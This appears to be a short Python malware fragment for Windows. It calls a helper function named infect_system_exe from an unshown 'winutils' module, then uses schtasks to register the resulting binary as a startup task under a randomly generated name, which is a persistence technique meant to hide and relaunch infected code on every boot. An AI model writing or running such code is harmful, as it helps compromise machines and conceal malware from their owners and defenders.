import winutils
import subprocess

binary = winutils.infect_system_exe()

subprocess.call(['schtasks', '/create', '/tn', winutils.random_name(), '/tr', binary, '/sc', 'onstart'])